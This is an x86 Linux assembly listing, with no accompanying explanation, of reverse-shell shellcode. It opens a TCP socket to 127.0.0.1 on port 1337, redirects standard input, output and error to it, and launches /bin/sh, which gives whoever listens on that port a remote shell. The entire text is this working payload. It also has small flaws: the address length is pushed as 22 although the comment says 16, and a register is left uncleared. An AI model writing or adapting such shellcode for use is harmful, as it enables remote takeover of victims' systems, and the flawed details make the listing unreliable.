section .text:
    global _start

_start:
    ; sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
    xor     eax, eax
    push    0x06        ; IPPROTO_TCP
    push    0x01        ; SOCK_STREAM
    push    0x02        ; AF_INET
    push    esp
    pop     ecx

    mov     al, 0x66    ; sys_socketcall
    mov     bl, 0x01    ; sys_socket
    int     0x80
    mov     esi, eax
    pop     eax
    pop     eax
    pop     eax

    ; set up addr struct
    xor     eax, eax
    push    0x0100007f
    push    word 0x3905 ; sin_port = htons(1337)
    push    word 0x02   ; sin_family = AF_INET
    push    esp
    pop     edx

    ; connect(sockfd, addr, 16)
    push    0x16        ; 16
    push    edx         ; &addr
    push    esi         ; sockfd
    push    esp
    pop     ecx

    mov     al, 0x66    ; sys_socketcall
    mov     bl, 0x03    ; sys_connect
    int     0x80
    pop     eax
    pop     eax
    pop     eax
    pop     eax
    pop     eax

    ; dup2(sockfd, 0), dup2(sockfd, 1), dup2(sockfd, 2)
    mov     ebx, esi
    xor     ecx, ecx
loop:
    xor     eax, eax
    mov     al, 0x3f
    int     0x80
    inc     ecx
    cmp     ecx, 3
    jne     loop

    ; execve("/bin/sh", {"/bin/sh", NULL}, NULL)
    xor     eax, eax
    cdq
    push    edx
    push    0x68732f2f
    push    0x6e69622f
    push    esp
    pop     ebx
    push    edx
    push    ebx
    push    esp
    pop     ecx
    mov     al, 0xb
    int     0x80

